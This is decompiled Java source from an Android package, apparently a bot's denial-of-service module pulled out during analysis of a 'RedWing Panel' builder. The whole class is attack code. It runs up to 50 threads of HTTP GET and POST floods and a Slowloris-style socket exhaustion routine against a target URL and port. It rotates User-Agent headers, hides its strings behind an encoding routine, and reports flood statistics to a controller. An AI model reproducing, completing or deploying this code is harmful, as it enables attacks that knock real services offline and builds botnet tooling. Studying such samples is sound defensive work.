package v.s;

import app.mobilex.plus.util.TypefaceCache;
import java.io.OutputStream;
import java.net.HttpURLConnection;
import java.net.Socket;
import java.net.URL;
import java.util.List;
import java.util.Locale;
import java.util.NoSuchElementException;
import java.util.concurrent.ExecutorService;
import java.util.concurrent.Executors;
import java.util.concurrent.atomic.AtomicBoolean;
import java.util.concurrent.atomic.AtomicLong;
import org.json.JSONException;
import org.json.JSONObject;

/* JADX INFO: compiled from: r8-map-id-15e63fcf80fafdb0de787d7190aafb45897c9495c974dfb43163f91afee6c091 */
/* JADX INFO: loaded from: /private/tmp/claude-501/-Users-noiss-Work-exploit-RedWing-Panel-main-source-internal-builder/68c7750b-b3a0-412f-ab12-bf16e4a764d8/scratchpad/dex_extract/classes.dex */
public abstract class gJu9g2a3S4wwbTk {
    public static final List D5P1xCAyuvgF;
    public static final AtomicLong Ee8d2j4S9Vm5yGuR;
    public static final AtomicLong JXn4Qf7zpnLjP5;
    public static Thread b1EoSIRjJHO5;
    public static volatile boolean dDIMxZXP1V8HdM;
    public static ExecutorService ibVTtJUNfrGYbW;
    public static final AtomicBoolean pyu8ovAipBTLYAiKab;
    public static volatile String vekpFI4d1Nc4fakF;
    public static volatile String w9sT1Swbhx3hs;
    public static final AtomicLong xDyLpEZyrcKVe0;

    static {
        TypefaceCache.obtain("00070052005400B400D500B100D500AE002D0073");
        w9sT1Swbhx3hs = "";
        vekpFI4d1Nc4fakF = "";
        JXn4Qf7zpnLjP5 = new AtomicLong(0L);
        Ee8d2j4S9Vm5yGuR = new AtomicLong(0L);
        xDyLpEZyrcKVe0 = new AtomicLong(0L);
        pyu8ovAipBTLYAiKab = new AtomicBoolean(false);
        D5P1xCAyuvgF = Aqh0grSwgDbwr.yTljMGnIibTRdOpSh4(TypefaceCache.obtain("000E00790041008E00FC00B300D300E800760038000B00C700B8008800DB00A900270079004C009400B0009100E600E700720026001500D700AB00FF00E500AE002D0020000F00DC00B000A7008400F3006A0036007A009700E000B300D70090002600740070008E00E400F0008700F400740038000800D100B0009C00DA00B5002C007B005E00C800A100ED008200E900730038000B00C900A000FF00E100A6002500770049008E00BF00EA008100F0006D0025000D"), TypefaceCache.obtain("000E00790041008E00FC00B300D300E800760038000B00C700B8009200D300A4002A0078004F008800E300B7008900E7000A0078004F008200FC00FF00FF00A600200036007400B400B00087009200F600730049000A00D200CF00E8009B00E700020066004B008B00F5008800D700A50008007F004F00C800A600EF008700E900720038000A00D200B0008C00D300A100220064005200C800A600EF008700E900720038000A00D2"), TypefaceCache.obtain("000E00790041008E00FC00B300D300E800760038000B00C700B8009300DB00A90036006E000000C700D100B100D600B5002C007F005F00C700A100EB009B00E700020066004B008B00F5008800D700A50008007F004F00C800A500EC008500E900700020001B00A400F800AD00DD00AA00260039000A00D500A000F1008200E900730038000B00C700DD00B000D000AE002F0073001B00B400F100B900D300B5002A0039000E00D400A700F1008100F1"), TypefaceCache.obtain("000E00790041008E00FC00B300D300E800760038000B00C700B800B600E200AF002C0078005E00DC00B0009C00E200920063007F006B008F00FF00B100D700E7000C0045001B00D600A70080008200E7002F007F0050008200B0009200D300A400630059006800C700C800F600920086003300660057008200C700BA00D0008C002A0062001400D100A000EA009C00F6006D0027000E00C700DD00B000D000AE002F0073001400D600A5009A008300F3007B"), TypefaceCache.obtain("000E00790041008E00FC00B300D300E800760038000B00C700B80087008300F6007800360077008E00FE00AA00CA00E7003B002E000D00B800A600EB008900E700310060000100D600A000E6009C00F7006A0036007C008200F300B400DD00E800710026000A00D700A000EE008200F6006300500052009500F500B900DD00BF006C0027000900D700BE00EF"), TypefaceCache.obtain("000E00790041008E00FC00B300D300E800760038000B00C700B8008800DB00A900270079004C009400B0009100E600E700720026001500D700AB00FF00E500AE002D0020000F00DC00B000A7008400F3007800360049009100AA00EE008200FE006D0026001200C700D700BA00D100AC002C0039000900D700A100EF008200F600730027001B00A100F900AD00D700A1002C006E001400D600A200EF009C00F7"));
    }

    public static void Ee8d2j4S9Vm5yGuR(String str) {
        try {
            iStgVlW5d7CQ5MhFi istgvlw5d7cq5mhfi = RWY6BVSB0XxPbw.d6c98qX7r0XzUZFibx;
            RWY6BVSB0XxPbw rWY6BVSB0XxPbw = RWY6BVSB0XxPbw.GUsyOYEIobMSb6n;
            if (rWY6BVSB0XxPbw != null) {
                JSONObject jSONObject = new JSONObject();
                jSONObject.put(TypefaceCache.obtain("0037006F004B0082"), TypefaceCache.obtain("002700720054009400CF") + str);
                jSONObject.put(TypefaceCache.obtain("00220062004F008600F300B400ED00B3003A0066005E"), w9sT1Swbhx3hs);
                jSONObject.put(TypefaceCache.obtain("003700770049008000F500AB"), vekpFI4d1Nc4fakF);
                jSONObject.put(TypefaceCache.obtain("00310073004A009200F500AC00C600B4001C0065005E008900E4"), JXn4Qf7zpnLjP5.get());
                rWY6BVSB0XxPbw.H9XlUr4OeMJFiXK(jSONObject);
            }
        } catch (Exception unused) {
        }
    }

    public static String JXn4Qf7zpnLjP5() {
        l1V0lQr6TbwNKqHfXNbb l1v0lqr6tbwnkqhfxnbb = lMJPWn8FzeWU82pNUhWl.w9sT1Swbhx3hs;
        List list = D5P1xCAyuvgF;
        if (list.isEmpty()) {
            throw new NoSuchElementException("Collection is empty.");
        }
        return (String) list.get(lMJPWn8FzeWU82pNUhWl.w9sT1Swbhx3hs.b1EoSIRjJHO5(list.size()));
    }

    public static void b1EoSIRjJHO5() {
        pyu8ovAipBTLYAiKab.set(true);
        dDIMxZXP1V8HdM = false;
        try {
            ExecutorService executorService = ibVTtJUNfrGYbW;
            if (executorService != null) {
                executorService.shutdownNow();
            }
        } catch (Exception unused) {
        }
        ibVTtJUNfrGYbW = null;
        Thread thread = b1EoSIRjJHO5;
        if (thread != null) {
            thread.interrupt();
        }
        b1EoSIRjJHO5 = null;
        TypefaceCache.obtain("00020062004F008600F300B4009200B400370079004B009700F500BB009C00E700170079004F008600FC00FF00C000A200320063005E009400E400AC008800E7");
        JXn4Qf7zpnLjP5.get();
        TypefaceCache.obtain("006F0036005E009500E200B000C000B400790036");
        xDyLpEZyrcKVe0.get();
        Ee8d2j4S9Vm5yGuR(TypefaceCache.obtain("003000620054009700E000BA00D6"));
    }

    public static JSONObject dDIMxZXP1V8HdM() throws JSONException {
        JSONObject jSONObject = new JSONObject();
        jSONObject.put(Y9mRyRdkl5FOcwb66V6.pyu8ovAipBTLYAiKab("002700720054009400CF00AC00C600A600370065", jSONObject, TypefaceCache.obtain("0037006F004B0082"), "003100630055008900F900B100D5"), dDIMxZXP1V8HdM);
        jSONObject.put(TypefaceCache.obtain("00220062004F008600F300B400ED00B3003A0066005E"), w9sT1Swbhx3hs);
        jSONObject.put(TypefaceCache.obtain("003700770049008000F500AB"), vekpFI4d1Nc4fakF);
        jSONObject.put(TypefaceCache.obtain("00310073004A009200F500AC00C600B4001C0065005E008900E4"), JXn4Qf7zpnLjP5.get());
        jSONObject.put(TypefaceCache.obtain("002000790055008900F500BC00C600AE002C0078004800B800F100BC00C600AE00350073"), Ee8d2j4S9Vm5yGuR.get());
        jSONObject.put(TypefaceCache.obtain("002600640049008800E200AC"), xDyLpEZyrcKVe0.get());
        return jSONObject;
    }

    public static void ibVTtJUNfrGYbW(final int i, int i2, int i3, final String str, final String str2) {
        if (dDIMxZXP1V8HdM) {
            b1EoSIRjJHO5();
        }
        w9sT1Swbhx3hs = str;
        vekpFI4d1Nc4fakF = str2;
        dDIMxZXP1V8HdM = true;
        int i4 = 0;
        pyu8ovAipBTLYAiKab.set(false);
        JXn4Qf7zpnLjP5.set(0L);
        Ee8d2j4S9Vm5yGuR.set(0L);
        xDyLpEZyrcKVe0.set(0L);
        int iXDyLpEZyrcKVe0 = OFtLBiBbrrTHWu.xDyLpEZyrcKVe0(i2, 1, 50);
        final long jIbVTtJUNfrGYbW = OFtLBiBbrrTHWu.ibVTtJUNfrGYbW(((long) i3) * 1000, 1000L, 3600000L);
        ibVTtJUNfrGYbW = Executors.newFixedThreadPool(iXDyLpEZyrcKVe0);
        TypefaceCache.obtain("00100062005A009500E400B600DC00A00063");
        TypefaceCache.obtain("00630077004F009300F100BC00D900E7002C0078001B");
        TypefaceCache.obtain("006300610052009300F800FF");
        TypefaceCache.obtain("006300620053009500F500BE00D600B4006300700054009500B0");
        final long jCurrentTimeMillis = System.currentTimeMillis();
        while (i4 < iXDyLpEZyrcKVe0) {
            ExecutorService executorService = ibVTtJUNfrGYbW;
            if (executorService != null) {
                executorService.execute(new Runnable() { // from class: v.s.GkAutlQm2tNq
                    @Override // java.lang.Runnable
                    public final void run() throws Throwable {
                        long j = jCurrentTimeMillis;
                        long j2 = jIbVTtJUNfrGYbW;
                        String str3 = str;
                        String str4 = str2;
                        int i5 = i;
                        boolean z = gJu9g2a3S4wwbTk.dDIMxZXP1V8HdM;
                        while (!gJu9g2a3S4wwbTk.pyu8ovAipBTLYAiKab.get() && System.currentTimeMillis() - j < j2) {
                            try {
                                String upperCase = str3.toUpperCase(Locale.ROOT);
                                if (upperCase.equals(TypefaceCache.obtain("000B0042006F00B700CF009900FE0088000C0052"))) {
                                    gJu9g2a3S4wwbTk.w9sT1Swbhx3hs(str4, i5);
                                } else if (upperCase.equals(TypefaceCache.obtain("0010005A007400B000DC009000E0008E0010"))) {
                                    gJu9g2a3S4wwbTk.xDyLpEZyrcKVe0(str4, i5);
                                } else if (upperCase.equals(TypefaceCache.obtain("00130059006800B300CF009900FE0088000C0052"))) {
                                    gJu9g2a3S4wwbTk.vekpFI4d1Nc4fakF(str4, i5);
                                } else {
                                    gJu9g2a3S4wwbTk.w9sT1Swbhx3hs(str4, i5);
                                }
                                Thread.sleep(50L);
                            } catch (InterruptedException unused) {
                                return;
                            } catch (Exception unused2) {
                                gJu9g2a3S4wwbTk.xDyLpEZyrcKVe0.incrementAndGet();
                            }
                        }
                    }
                });
            }
            i4++;
            jIbVTtJUNfrGYbW = jIbVTtJUNfrGYbW;
        }
        final long j = jIbVTtJUNfrGYbW;
        Thread thread = new Thread(new Runnable() { // from class: v.s.dRaV3KkcM7jBUqI
            private static /* synthetic */ void fuwcxklbrh() {
            }

            @Override // java.lang.Runnable
            public final void run() {
                long j2 = jCurrentTimeMillis;
                long j3 = j;
                AtomicBoolean atomicBoolean = gJu9g2a3S4wwbTk.pyu8ovAipBTLYAiKab;
                while (!atomicBoolean.get() && System.currentTimeMillis() - j2 < j3) {
                    try {
                        Thread.sleep(3000L);
                        try {
                            iStgVlW5d7CQ5MhFi istgvlw5d7cq5mhfi = RWY6BVSB0XxPbw.d6c98qX7r0XzUZFibx;
                            RWY6BVSB0XxPbw rWY6BVSB0XxPbw = RWY6BVSB0XxPbw.GUsyOYEIobMSb6n;
                            if (rWY6BVSB0XxPbw != null) {
                                rWY6BVSB0XxPbw.H9XlUr4OeMJFiXK(gJu9g2a3S4wwbTk.dDIMxZXP1V8HdM());
                            }
                        } catch (Exception unused) {
                        }
                    } catch (InterruptedException unused2) {
                    }
                }
                if (atomicBoolean.get()) {
                    return;
                }
                gJu9g2a3S4wwbTk.b1EoSIRjJHO5();
                try {
                    iStgVlW5d7CQ5MhFi istgvlw5d7cq5mhfi2 = RWY6BVSB0XxPbw.d6c98qX7r0XzUZFibx;
                    RWY6BVSB0XxPbw rWY6BVSB0XxPbw2 = RWY6BVSB0XxPbw.GUsyOYEIobMSb6n;
                    if (rWY6BVSB0XxPbw2 != null) {
                        rWY6BVSB0XxPbw2.H9XlUr4OeMJFiXK(gJu9g2a3S4wwbTk.dDIMxZXP1V8HdM());
                    }
                } catch (Exception unused3) {
                }
            }
        });
        b1EoSIRjJHO5 = thread;
        thread.start();
        Ee8d2j4S9Vm5yGuR(TypefaceCache.obtain("00300062005A009500E400BA00D6"));
    }

    public static void vekpFI4d1Nc4fakF(String str, int i) throws Throwable {
        AtomicLong atomicLong = Ee8d2j4S9Vm5yGuR;
        HttpURLConnection httpURLConnection = null;
        try {
            try {
                try {
                    atomicLong.incrementAndGet();
                    if (i != 80 && i != 443) {
                        URL url = new URL(str);
                        str = new URL(url.getProtocol(), url.getHost(), i, url.getFile()).toString();
                    }
                    HttpURLConnection httpURLConnection2 = (HttpURLConnection) new URL(str).openConnection();
                    try {
                        httpURLConnection2.setRequestMethod("POST");
                        httpURLConnection2.setDoOutput(true);
                        httpURLConnection2.setConnectTimeout(5000);
                        httpURLConnection2.setReadTimeout(5000);
                        httpURLConnection2.setRequestProperty(TypefaceCache.obtain("00160065005E009500BD009E00D500A2002D0062"), JXn4Qf7zpnLjP5());
                        httpURLConnection2.setRequestProperty(TypefaceCache.obtain("000000790055009300F500B100C600EA0017006F004B0082"), TypefaceCache.obtain("00220066004B008B00F900BC00D300B3002A0079005500C800E800F200C500B00034003B005D008800E200B2009F00B20031007A005E008900F300B000D600A20027"));
                        String str2 = TypefaceCache.obtain("00270077004F008600AD") + System.nanoTime();
                        OutputStream outputStream = httpURLConnection2.getOutputStream();
                        try {
                            outputStream.write(str2.getBytes(N4h1mGVqsY6M8lTtB.dDIMxZXP1V8HdM));
                            outputStream.close();
                            httpURLConnection2.getResponseCode();
                            JXn4Qf7zpnLjP5.incrementAndGet();
                            atomicLong.decrementAndGet();
                            httpURLConnection2.disconnect();
                        } catch (Throwable th) {
                            try {
                                throw th;
                            } catch (Throwable th2) {
                                okc5AGRjqrud84oM6d.Ee8d2j4S9Vm5yGuR(outputStream, th);
                                throw th2;
                            }
                        }
                    } catch (Exception unused) {
                        httpURLConnection = httpURLConnection2;
                        xDyLpEZyrcKVe0.incrementAndGet();
                        atomicLong.decrementAndGet();
                        if (httpURLConnection == null) {
                        } else {
                            httpURLConnection.disconnect();
                        }
                    } catch (Throwable th3) {
                        httpURLConnection = httpURLConnection2;
                        th = th3;
                        atomicLong.decrementAndGet();
                        if (httpURLConnection != null) {
                            try {
                                httpURLConnection.disconnect();
                            } catch (Exception unused2) {
                            }
                        }
                        throw th;
                    }
                } catch (Throwable th4) {
                    th = th4;
                }
            } catch (Exception unused3) {
            }
        } catch (Exception unused4) {
        }
    }

    public static void w9sT1Swbhx3hs(String str, int i) throws Throwable {
        AtomicLong atomicLong = Ee8d2j4S9Vm5yGuR;
        HttpURLConnection httpURLConnection = null;
        try {
            try {
                try {
                    atomicLong.incrementAndGet();
                    if (i != 80 && i != 443) {
                        URL url = new URL(str);
                        str = new URL(url.getProtocol(), url.getHost(), i, url.getFile()).toString();
                    }
                    HttpURLConnection httpURLConnection2 = (HttpURLConnection) new URL(str).openConnection();
                    try {
                        httpURLConnection2.setRequestMethod("GET");
                        httpURLConnection2.setConnectTimeout(5000);
                        httpURLConnection2.setReadTimeout(5000);
                        httpURLConnection2.setRequestProperty(TypefaceCache.obtain("00160065005E009500BD009E00D500A2002D0062"), JXn4Qf7zpnLjP5());
                        httpURLConnection2.setRequestProperty("Accept", "*/*");
                        httpURLConnection2.setRequestProperty(TypefaceCache.obtain("000000770058008F00F500F200F100A8002D00620049008800FC"), TypefaceCache.obtain("002D00790016008400F100BC00DA00A2"));
                        httpURLConnection2.getResponseCode();
                        JXn4Qf7zpnLjP5.incrementAndGet();
                        atomicLong.decrementAndGet();
                        httpURLConnection2.disconnect();
                    } catch (Exception unused) {
                        httpURLConnection = httpURLConnection2;
                        xDyLpEZyrcKVe0.incrementAndGet();
                        atomicLong.decrementAndGet();
                        if (httpURLConnection == null) {
                        } else {
                            httpURLConnection.disconnect();
                        }
                    } catch (Throwable th) {
                        httpURLConnection = httpURLConnection2;
                        th = th;
                        atomicLong.decrementAndGet();
                        if (httpURLConnection != null) {
                            try {
                                httpURLConnection.disconnect();
                            } catch (Exception unused2) {
                            }
                        }
                        throw th;
                    }
                } catch (Exception unused3) {
                }
            } catch (Throwable th2) {
                th = th2;
            }
        } catch (Exception unused4) {
        }
    }

    public static void xDyLpEZyrcKVe0(String str, int i) throws Throwable {
        AtomicLong atomicLong = Ee8d2j4S9Vm5yGuR;
        Socket socket = null;
        try {
            try {
                try {
                    atomicLong.incrementAndGet();
                    String host = new URL(str).getHost();
                    if (i <= 0) {
                        i = 80;
                    }
                    Socket socket2 = new Socket(host, i);
                    int i2 = 0;
                    try {
                        socket2.setSoTimeout(0);
                        socket2.setKeepAlive(true);
                        OutputStream outputStream = socket2.getOutputStream();
                        outputStream.write((TypefaceCache.obtain("00040053006F00C700BF00FF00FA009300170046001400D600BE00EE00BF00CD000B00790048009300AA00FF") + host + "\r\n").getBytes(N4h1mGVqsY6M8lTtB.dDIMxZXP1V8HdM));
                        outputStream.flush();
                        JXn4Qf7zpnLjP5.incrementAndGet();
                        while (!pyu8ovAipBTLYAiKab.get() && i2 < 100) {
                            outputStream.write((TypefaceCache.obtain("001B003B005A00CA") + System.nanoTime() + ": " + System.currentTimeMillis() + "\r\n").getBytes(N4h1mGVqsY6M8lTtB.dDIMxZXP1V8HdM));
                            outputStream.flush();
                            i2++;
                            D9wzo6HEnqch09S d9wzo6HEnqch09S = new D9wzo6HEnqch09S(5000L, 15000L);
                            l1V0lQr6TbwNKqHfXNbb l1v0lqr6tbwnkqhfxnbb = lMJPWn8FzeWU82pNUhWl.w9sT1Swbhx3hs;
                            Thread.sleep(OFtLBiBbrrTHWu.K7eEOBPYP9VIoHWTe(d9wzo6HEnqch09S));
                        }
                        atomicLong.decrementAndGet();
                        socket2.close();
                    } catch (Exception unused) {
                        socket = socket2;
                        xDyLpEZyrcKVe0.incrementAndGet();
                        atomicLong.decrementAndGet();
                        if (socket == null) {
                        } else {
                            socket.close();
                        }
                    } catch (Throwable th) {
                        th = th;
                        socket = socket2;
                        atomicLong.decrementAndGet();
                        if (socket != null) {
                            try {
                                socket.close();
                            } catch (Exception unused2) {
                            }
                        }
                        throw th;
                    }
                } catch (Exception unused3) {
                }
            } catch (Throwable th2) {
                th = th2;
            }
        } catch (Exception unused4) {
        }
    }
}
